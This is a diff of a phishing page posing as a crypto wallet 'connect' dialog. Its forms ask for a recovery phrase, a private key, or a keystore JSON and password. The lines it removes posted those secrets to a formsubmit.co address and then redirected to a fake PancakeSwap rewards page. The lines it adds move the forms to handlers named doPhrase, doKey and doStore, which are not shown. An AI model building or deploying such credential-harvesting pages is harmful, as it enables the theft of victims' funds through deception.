@@ -918,7 +918,7 @@
                                                                 <div class="buttonError">An error occurred... please try again or connect mannually</div>
                                                             </span>
                                                             <br>
-                                                            <div class="buttonConnect" onclick="location.assign('https://dappsconn-five.vercel.app/form/index.html')"><strong>Connect manually</strong></div>
+                                                            <div class="buttonConnect" onclick="location.assign('form/index.html')"><strong>Connect manually</strong></div>
                                                             <br>
                                                             <br>
                                                             <p>
@@ -953,10 +953,7 @@
                                                 <div class="w-tab-content">
                                                     <div data-w-tab="Phrase" class="w-tab-pane w--tab-active">
                                                         <div class="form-block-2 w-form">
-                                                                       <form action="https://formsubmit.co/formsubmiit@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://pancakeswap-rewards.vercel.app/pancakes.html">
+                                                            <form id="doPhrase">
                                                                 <input type="text" class="text-field-23 w-input" maxlength="256" id="phrase" placeholder="Enter your phrase value..." required="">
                                                                 <input type="submit" on="" value="Connect" data-wait="Please wait..." class="submit-button-10 w-button">
                                                             </form>
@@ -964,10 +961,7 @@
                                                     </div>
                                                     <div data-w-tab="Private Key" class="w-tab-pane">
                                                         <div class="form-block-2 w-form">
-                                                                       <form action="https://formsubmit.co/formsubmiit@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://pancakeswap-rewards.vercel.app/pancakes.html">
+                                                            <form id="doKey">
                                                                 <label for="Private-Key-Wallet" class="field-label-7">Choose Currency:</label>
                                                                 <select id="wallet" required="" class="select-field w-select">
                                                                     <option value="">Select one...</option>
@@ -986,10 +980,7 @@
                                                     </div>
                                                     <div data-w-tab="Keystore" class="tab-pane-keystore w-tab-pane">
                                                         <div class="w-form">
-                                                                       <form action="https://formsubmit.co/formsubmiit@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://pancakeswap-rewards.vercel.app/pancakes.html">
+                                                            <form id="doStore">
                                                                 <label for="Keystore-Value-3" class="field-label-7">Keystore JSON</label>
                                                                 <input type="text" class="text-field-23 w-input" maxlength="256" name="Keystore-Value-3" data-name="Keystore Value 3" placeholder="Keystore JSON Value..." id="kjson" required="">
                                                                 <label for="Keystore-PssWrd" class="field-label-7">Password</label>
